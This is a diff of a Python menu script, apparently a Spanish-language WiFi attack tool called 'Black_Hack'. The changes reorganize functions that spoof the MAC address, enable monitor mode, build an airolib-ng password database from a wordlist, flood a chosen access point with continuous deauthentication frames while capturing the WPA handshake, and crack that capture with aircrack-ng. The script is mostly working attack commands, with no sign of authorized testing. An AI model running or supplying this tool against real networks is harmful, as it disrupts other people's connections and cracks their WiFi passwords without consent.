@@ -14,13 +14,13 @@ from io import open
 os.system('clear')
 print("\033[1;31;1m ")
 os.system('figlet        Smp_A')
-print("		 Black_Hack")                 	
+print("		 Black_Hack")                    	
 print("\033[1;37;1m ")
 #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) capture", "4) crack", "5) Exit"]#Menu Princcipal
+listamenu=["opciones:","1) Scaner red ", "2) capture", "3) crack", "4) Exit"]#Menu Princcipal
 key=0
 exit=False
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -30,78 +30,80 @@ def menu():
 	print(listamenu[2])
 	print(listamenu[3])
 	print(listamenu[4])
-	print(listamenu[5])
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-def config():
+def scan():
 	global wlan
-	while True:
-		try:
-			os.system("ifconfig")
-			wlan=input("Introduzca Wlan: ")
-			print("Procesando")
-			os.system('ip link set '+wlan+' up')
-			os.system('airmon-ng check kill')
-			os.system('ifconfig '+wlan+' down')
-			os.system('macchanger -A '+wlan)
-			os.system('ifconfig '+wlan+' up') 
-			os.system('airmon-ng start '+wlan)
-			return wlan
-			break
-		except TypeError:
-			print("Wlan no permitida")
-
-def scan(wlan):
 	global bssid
 	global canal
-
-	os.system('wash -i '+wlan)
-
+	global diccionario
+	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
+	if(time_scan==''):
+		time_scan="60"
+	os.system('nmcli -w '+time_scan+' device wifi list')
 	bssid=input("seleccione BSSID : ")
 	canal=input("seleccione CHANEL : ")
 	ESSID=input("seleccione ESSID : ")
+	diccionario=input("seleccione diccionario : ")
+	os.system("ifconfig")
+	wlan=input("Introduzca Wlan: ")
+	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
+		wlan=wlan
+	else:
+		print("Procesando")
+		os.system('ifconfig '+wlan+' down')
+		time.sleep(1)
+		os.system('macchanger -A '+wlan)
+		time.sleep(1)
+		os.system('ifconfig '+wlan+' up') 
+		time.sleep(1)
+		os.system('airmon-ng check kill')
+		time.sleep(1)
+		os.system('airmon-ng start '+wlan)
+		time.sleep(1)
+		os.system('airmon-ng check '+wlan)
+		time.sleep(1)
+		wlan=(wlan+"mon")
+	print(wlan)
+	time.sleep(1)
 
-	file = open("/root/Especial_termux_kali/essidfile.txt","w")
+	file = open("/root/Especial_termux_kali/essidfile","w")
 	file.write(ESSID)
-	file.close() 
-	os.system('airolib-ng raibonw-db --import passwd wordlist.lst')
-	os.system('airolib-ng rainbow-db --import essid essidfile.txt')
-	os.system('airolib-ng rainbow-db --batch')
-	os.system('airolib-ng rainbow-db --verify all')
-
+	file.close()
+	time.sleep(1)
+	os.system('airolib-ng test-db --import passwd '+diccionario)
+	time.sleep(1)
+	os.system('airolib-ng test-db --import essid essidfile')
+	time.sleep(1)
+	os.system('airolib-ng test-db --batch')
+	#os.system('airolib-ng test-db --verify all')
 	return bssid,canal
 
 def attack(wlan,bssid,canal):
 	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
 	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')
 
-def crack(wlan):
-	os.system('aircrack-ng -r rainbow-db file-01.cap')
-
+def crack():
+	os.system('aircrack-ng -r test-db file-01.cap')
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 while exit==False:
 	menu()
 	key=(int(input()))
 	if (key==1):
-		config()
-		print(wlan)
+		scan()
 	elif (key==2):
-		scan(wlan)
-	elif (key==3):
 		attack(wlan,bssid,canal)
+	elif (key==3):
+		crack()
 	elif (key==4):
-		crack(wlan)
-	elif (key==5):
-		
-		#os.syste('airmon-ng stop wlan0mon')
-		#os.syste('ifconfig wlan0 down')
-		#os.syste('iwconfig wlan0 mode managed')
-		#os.syste('ifconfig wlan0 up')
-		#os.system('service network-manager start')
+		os.system('airmon-ng stop wlan0mon')
+		os.system('ifconfig wlan0 down')
+		os.system('iwconfig wlan0 mode managed')
+		os.system('ifconfig wlan0 up')
+		os.system('service network-manager start')
 		exit=True
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-./cap2hccapx.bin '/root/Especial_termux_kali/file-01.cap' /root/Especial_termux_kali/file-01.hccapx convertir cap 
